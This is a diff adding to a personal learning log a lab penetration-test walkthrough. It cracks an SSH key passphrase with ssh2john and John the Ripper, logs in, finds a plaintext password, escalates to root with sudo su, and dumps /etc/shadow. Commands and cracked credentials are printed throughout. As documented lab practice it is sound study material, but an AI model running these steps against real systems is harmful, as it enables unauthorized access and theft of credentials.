@@ -128,6 +128,125 @@ Today, I learned and practiced additional Linux networking, scanning, and exploi
   - `wp-info` to gather WordPress site information
   - `getuid` in Metasploit to identify current user privileges.
 
+---
+# Penetration Testing Progress – SSH Private Key Crack & Privilege Escalation
+
+This document logs the steps, commands, and outcomes of a penetration test involving an SSH private key crack and privilege escalation on a target machine.
+
+---
+
+## 🛠 Step 1 – Convert SSH Private Key to John Format
+We started with a private key file (`kay`) and converted it to a format readable by **John the Ripper**.
+
+```bash
+ssh2john kay > kaypass
+```
+
+**Result:**  
+Created a file `kaypass` containing the hash of the SSH private key.
+
+---
+
+## 🛠 Step 2 – Crack the Passphrase with John the Ripper
+We used the **rockyou.txt** wordlist to crack the passphrase.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt kaypass
+```
+
+**Output:**
+```
+beeswax          (kay)
+```
+
+**Finding:**  
+- Passphrase for the key: **beeswax**
+
+---
+
+## 🛠 Step 3 – Set Proper Permissions for the Private Key
+SSH requires private keys to have restrictive permissions (600).
+
+```bash
+chmod 600 kay
+```
+
+---
+
+## 🛠 Step 4 – Connect to Target Machine via SSH
+We connected using the cracked passphrase.
+
+```bash
+ssh kay@10.0.2.7 -i kay
+```
+
+**When prompted for the passphrase:**
+```
+beeswax
+```
+
+**Login Success:**  
+We accessed the target as user `kay`.
+
+---
+
+## 🛠 Step 5 – Explore Home Directory
+Listed files and found a potential password file.
+
+```bash
+ls
+cat pass.bak
+```
+
+**Finding:**
+```
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+```
+
+---
+
+## 🛠 Step 6 – Privilege Escalation to Root
+We attempted `sudo su` and used the found password.
+
+```bash
+sudo su
+```
+
+**Password:**  
+```
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+```
+
+**Success:**  
+We obtained a root shell.
+
+---
+
+## 🛠 Step 7 – Access `/etc/shadow`
+As root, we retrieved the contents of the `/etc/shadow` file for further exploitation.
+
+```bash
+cat /etc/shadow
+```
+
+**Finding:**  
+Obtained password hashes for all system users, including `root`, `kay`, and `jan`.
+
+---
+
+## 📌 Summary of Findings
+- **SSH Key Passphrase:** `beeswax`
+- **User Password (kay):** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
+- **Root Access:** Achieved via `sudo su` using `kay`'s password.
+- **Sensitive Files Accessed:** `/etc/shadow`
+
+---
+
+## ⚠️ Disclaimer
+This activity was performed in a controlled lab environment for educational purposes only.  
+Unauthorized access to computer systems is illegal.
+
+
 
 
 
